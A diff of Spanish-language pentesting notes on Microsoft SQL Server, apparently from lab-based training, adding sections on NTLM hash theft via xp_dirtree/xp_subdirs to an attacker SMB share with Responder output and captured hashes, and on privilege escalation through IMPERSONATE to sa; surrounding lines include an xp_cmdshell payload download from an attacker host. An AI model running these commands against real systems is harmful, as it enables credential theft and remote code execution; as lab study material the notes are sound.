@@ -4,7 +4,7 @@ Microsoft SQL Server es el sistema de gestión de bases de datos de Microsoft, m
 
 MSSQL es especialmente interesante en pentests porque tiene funcionalidades integradas que permiten ejecutar comandos del sistema operativo directamente desde consultas SQL.
 
-### Puertos
+## Puertos
 
 | Puerto            | Servicio             | Descripción                                            |
 | ----------------- | -------------------- | ------------------------------------------------------ |
@@ -12,9 +12,9 @@ MSSQL es especialmente interesante en pentests porque tiene funcionalidades inte
 | `1434` UDP        | SQL Server Browser   | Revela instancias disponibles en el servidor           |
 | Puertos dinámicos | Instancias nombradas | Las instancias adicionales usan puertos TCP aleatorios |
 
-### Enumeración
+## Enumeración
 
-#### Nmap
+### Nmap
 
 ```bash
 # Detección básica
@@ -31,7 +31,7 @@ nmap --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=
 nmap --script ms-sql-info -p 1433,1434 -sU -sV target
 ```
 
-#### impacket-mssqlclient
+### impacket-mssqlclient
 
 `mssqlclient.py` de Impacket es la herramienta más usada para conectarse a MSSQL en pentests:
 
@@ -49,7 +49,7 @@ impacket-mssqlclient DOMINIO/usuario@target -hashes :NTLM_HASH -windows-auth
 impacket-mssqlclient usuario:contraseña@target -db nombre_db
 ```
 
-#### Otros clientes
+### Otros clientes
 
 ```bash
 # sqsh (cliente MSSQL para Linux)
@@ -99,6 +99,8 @@ EXEC sp_linkedservers;
 SELECT name FROM sys.servers WHERE is_linked = 1;
 ```
 
+## Ataques
+
 ### xp\_cmdshell — ejecución de comandos del sistema
 
 `xp_cmdshell` es un procedimiento almacenado extendido de MSSQL que permite ejecutar comandos del sistema operativo directamente desde una consulta SQL. Es la forma más directa de obtener RCE desde MSSQL.
@@ -136,7 +138,129 @@ EXEC xp_cmdshell 'echo "contenido" > C:\ruta\archivo.txt';
 EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://attacker/payload.exe -OutFile C:\Windows\Temp\payload.exe"';
 ```
 
-### Linked Servers — movimiento lateral
+### Capturar el hash del servicio MSSQL
+
+Para hacer el robo de hashes tenemos que tener activado Responder en otra terminal esperando.
+
+```bash
+pyrhos@htb[/htb]$ sudo responder -I tun0
+
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
+<SNIP>
+
+[+] Listening for events...
+```
+
+o también podemos capturar el hash con impacket
+
+```bash
+pyrhos@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
+[*] Config file parsed                                                 
+[*] Config file parsed                                                 
+[*] Config file parsed
+[*] Incoming connection (10.129.203.7,49728)
+[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+[*] User WINSRV02\mssqlsvc authenticated successfully                        
+[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+[*] Closing down connection (10.129.203.7,49728)                      
+[*] Remaining connections []
+```
+
+#### Robo de hash con xp\_dirtree
+
+```sql
+1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2> GO
+```
+
+#### Robo de hash con xp\_subdirs
+
+```sql
+1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2> GO
+```
+
+Despues de haber ejecutado una de estas 2 opciones en el responder nos saldra el hash
+
+```bash
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+```
+
+### Suplantación de usuarios&#x20;
+
+SQL Server tiene un permiso especial, llamado `IMPERSONATE`, que permite al usuario en ejecución asumir los permisos de otro usuario o iniciar sesión hasta que se restablezca el contexto o finalice la sesión.
+
+**Identificar usuarios que podemos suplantar**
+
+```cmd
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+name
+-----------------------------------------------
+sa
+ben
+valentin
+
+(3 rows affected)
+```
+
+**Verificación de nuestro usuario y rol actual**
+
+```cmd
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+-----------
+julio                                                                                                                    
+
+(1 rows affected)
+
+-----------
+          0
+
+(1 rows affected)
+```
+
+**Hacerse pasar por otro usuario**
+
+```cmd
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+
+-----------
+sa
+
+(1 rows affected)
+
+-----------
+          1
+
+(1 rows affected)
+```
+
+> Es recomendable correr `EXECUTE AS LOGIN` dentro de la base de datos maestra, porque todos los usuarios, por defecto, tienen acceso a esa base de datos.&#x20;
+>
+> Si un usuario que estás intentando suplantar no tiene acceso a la base de datos a la que te estás conectando, presentará un error. muevete a la base de datos maestra usando `USE master`.<br>
+
+## Linked Servers — movimiento lateral
 
 Si MSSQL tiene servidores enlazados (_linked servers_), se pueden ejecutar consultas en otros servidores de base de datos usando el contexto de autenticación del enlace:
 
@@ -151,7 +275,7 @@ SELECT * FROM OPENQUERY([servidor_enlazado], 'SELECT @@version');
 EXEC ('xp_cmdshell ''whoami''') AT [servidor_enlazado];
 ```
 
-### Riesgos y misconfiguraciones
+## Riesgos y misconfiguraciones
 
 | Riesgo                                                 | Descripción                                                                                              |
 | ------------------------------------------------------ | -------------------------------------------------------------------------------------------------------- |
